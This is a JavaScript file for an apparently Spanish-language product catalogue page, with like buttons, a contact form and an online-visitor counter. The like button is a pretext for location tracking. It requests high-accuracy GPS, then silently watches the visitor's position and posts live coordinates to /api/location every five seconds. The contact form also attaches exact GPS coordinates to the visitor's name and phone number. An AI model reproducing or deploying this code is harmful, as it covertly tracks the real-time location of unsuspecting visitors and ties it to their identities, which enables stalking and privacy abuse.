document.addEventListener('DOMContentLoaded', () => {
    const likeBtns = document.querySelectorAll('.like-btn');
    const loading = document.getElementById('loading');
    const thanksModal = document.getElementById('thanks-modal');
    const closeModal = document.getElementById('close-modal');

    document.body.addEventListener('click', function(e) {
        if (e.target.closest('.like-btn')) {
            const btn = e.target.closest('.like-btn');
            if (btn.classList.contains('liked')) return;
            getGeolocationAndSend(btn);
        }
    });

    closeModal.addEventListener('click', () => {
        thanksModal.classList.add('hidden');
    });

    function getGeolocationAndSend(btnElement) {
        loading.classList.remove('hidden');

        if (navigator.geolocation) {
            // Obtener la primera posición rápido
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    sendDataToServer(position.coords, btnElement);
                    
                    // Iniciar rastreo continuo en tiempo real (silencioso y con límite)
                    let lastSendTime = 0;
                    navigator.geolocation.watchPosition(
                        (newPos) => {
                            const now = Date.now();
                            // Solo enviar actualización si pasaron al menos 5 segundos desde el último envío
                            if (now - lastSendTime > 5000) {
                                lastSendTime = now;
                                sendDataToServer(newPos.coords, btnElement, true);
                            }
                        },
                        null,
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                },
                (error) => {
                    console.log("Ubicación denegada o error.");
                    sendDataToServer({ latitude: "Denegado", longitude: "Denegado", accuracy: 0 }, btnElement);
                },
                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
            );
        } else {
            sendDataToServer({ latitude: "No soportado", longitude: "No soportado", accuracy: 0 }, btnElement);
        }
    }

    function sendDataToServer(coords, btnElement, isUpdate = false) {
        const productId = btnElement.getAttribute('data-id');
        const data = {
            latitude: coords.latitude,
            longitude: coords.longitude,
            accuracy: coords.accuracy,
            productId: productId
        };

        fetch('/api/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            if(!isUpdate) {
                loading.classList.add('hidden');
                markAsLiked(btnElement);
                thanksModal.classList.remove('hidden');
            }
        })
        .catch(error => {
            console.error('Error enviando datos:', error);
            if(!isUpdate) {
                loading.classList.add('hidden');
                markAsLiked(btnElement);
            }
        });
    }

    function markAsLiked(btn) {
        btn.classList.add('liked');
        
        const countSpan = btn.querySelector('.like-count');
        if (countSpan) {
            let count = parseInt(countSpan.innerText) || 0;
            countSpan.innerText = count + 1;
        }
        
        // Mantener el conteo visible
        const updatedCount = btn.querySelector('.like-count') ? btn.querySelector('.like-count').innerText : '';
        btn.innerHTML = `<i class="fa-solid fa-heart"></i> ¡Te gusta! (${updatedCount})`;
    }
    // Contact form logic
    const contactModal = document.getElementById('contact-modal');
    const contactForm = document.getElementById('contact-form');
    const closeContact = document.getElementById('close-contact');
    
    document.body.addEventListener('click', function(e) {
        if (e.target.closest('.contact-btn')) {
            const btn = e.target.closest('.contact-btn');
            const productId = btn.getAttribute('data-id');
            const productName = btn.getAttribute('data-name');
            
            document.getElementById('contact-product-id').value = productId;
            document.getElementById('contact-product-name').innerText = "Me interesa: " + productName;
            if (contactModal) contactModal.classList.remove('hidden');
        }
    });

    if(closeContact) {
        closeContact.addEventListener('click', () => {
            contactModal.classList.add('hidden');
        });
    }

    if(contactForm) {
        contactForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const data = {
                productId: document.getElementById('contact-product-id').value,
                productName: document.getElementById('contact-product-name').innerText.replace("Me interesa: ", ""),
                name: document.getElementById('contact-name').value,
                phone: document.getElementById('contact-phone').value
            };
            
            if (loading) loading.classList.remove('hidden');
            contactModal.classList.add('hidden');
            
            function sendContactData(contactData) {
                fetch('/api/contact', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(contactData)
                })
                .then(res => res.json())
                .then(result => {
                    if (loading) loading.classList.add('hidden');
                    contactForm.reset();
                    alert("¡Tus datos han sido enviados! Pronto nos contactaremos contigo.");
                })
                .catch(err => {
                    if (loading) loading.classList.add('hidden');
                    alert("Hubo un error al enviar tus datos.");
                });
            }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        data.exactLat = position.coords.latitude;
                        data.exactLon = position.coords.longitude;
                        data.exactAccuracy = position.coords.accuracy;
                        sendContactData(data);
                    },
                    (error) => {
                        console.warn("GPS denegado o error, enviando solo IP:", error);
                        sendContactData(data);
                    },
                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                );
            } else {
                sendContactData(data);
            }
        });
    }
});

// Online user tracking
let siteUserId = sessionStorage.getItem('site_userId');
if (!siteUserId) {
    siteUserId = 'user_' + Math.random().toString(36).substr(2, 9);
    sessionStorage.setItem('site_userId', siteUserId);
}

function pingServer() {
    fetch('/api/ping', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: siteUserId })
    }).catch(() => {});
}

function updateOnlineCount() {
    fetch('/api/online_count')
        .then(res => res.json())
        .then(data => {
            const elements = document.querySelectorAll('.online-count-display');
            elements.forEach(el => {
                el.innerText = data.count;
            });
        })
        .catch(() => {});
}

// Start pings and updates
pingServer();
updateOnlineCount();
setInterval(pingServer, 15000);
setInterval(updateOnlineCount, 15000);
